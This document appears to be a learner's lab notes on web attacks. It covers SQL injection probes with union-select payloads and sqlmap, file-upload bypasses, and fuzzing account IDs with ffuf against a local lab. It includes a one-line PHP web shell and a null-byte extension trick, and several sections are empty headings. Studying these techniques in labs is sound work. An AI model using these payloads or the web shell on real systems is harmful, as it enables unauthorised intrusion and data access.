
## SQL Injection (SQLi)
*Lots of webpages store data in SQL databases. If they don't sanitize user inputs, then it is possible to query the database from an input field *

[Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

Detection
try single and double quotes 
'' ""
Use a # to terminate a line
```
<name>' or 1=1#
<name>' union select null, null#
<name>' union select null,null,version()#
<name>' union select null,null,table_name from information_schema.tables#
```
Since UNION joins parameters, it can only return as many

**Blind**
These are SQL injections that when executed, show no obvious clue to the user
1
**Cookies**


**SQL-Map**
Save a HTTP Post request with the query as a .txt
```
sqlmap -r <request file>
```
![[../../cheatsheet-sql-injection-fundamentals.pdf]]


## Cross Site Scripting (XSS)
## Command Injection
## Insecure File Upload
*Sometimes there are weak restrictions on file uploads*

Lets start easier with client side. 
Some systems authorize file uploads via client side. The file type is sent in the packet along with the file. If this is how it authz's, then it is possible to change the actual file-type of the file while leaving the part of the packet intact that does the authz. If changing just the header doesn't work there may be scanning after there may be server side authz.

```
<?php system($_GET['cmd']); ?>
```

You can all try using null bytes. This works with of PHP. Try change a file like this

```
image.php
```
to 
```
image.php%00.png
```
the null byte terminates the rest of the phrase, so it will instead end in the .php extension.

Now lets look at more server side techniques.

At the top of a file is metadata. You can see this metadata when you cat the file into the terminal. If the server authz's the file like this, then you will need to use a file matching the type you want. Send it, and capture the request in burp. Then clear out unneeded parts of the spoofed file-type and then insert the payload directly into it in burp.

![[../../cheatsheet-file-inclusion.pdf]]

## AUTHN Attacks
## External Entities Injection (XXE)
## Insecure Direct Object Reference (IDOR)
*Being able to manipulate a variable we really shouldn't even be able to see*
Here is a quick example, lets say you see this site
![[../../Pasted image 20250508150908.png]]
Lets look at that URL
![[../../Pasted image 20250508150933.png]]
It looks like the URL query PHP to show the account. The URL is *directly referencing* the account *object* in an *insecure* way. To exploit this I generated a list of numbers I thought would be in range.
![[../../Pasted image 20250508151416.png]]
Now I'll save this to a .txt file with
```
python3 -c "for i in range(1000,1201): print(i)" >> range.txt
```
Now lets use ffuf to fuzz out what numbers correspond with real accounts.
```
ffuf -c -u "http://127.0.0.1/labs/e0x02.php?account=FUZZ" -w range.txt
```
From here this shows us every single fuzzing attempt. Now find an index that was not a real account. While http file size will vary if you change based on the response, the not found probably won't change. So find a failed response size and add "-fs 849" to ffuf.
```
ffuf -u 'http://127.0.0.1/labs/e0x02.php?account=FUZZ' -w range.txt -fs 849

```
![[../../Pasted image 20250508152216.png]]
Now all the responses we get are for real users. 
To identify all the options i configured BurpSuite to show me all the admin and user accounts by using the grep-match option
![[../../Pasted image 20250508153934.png]]![[../../Pasted image 20250508153948.png]]
![[../../Pasted image 20250508154015.png]]
Using this we have found that the admins are
- 1008
- 1010
- 1012
- 1014
and the users are 1001-1019
### Capstone Notes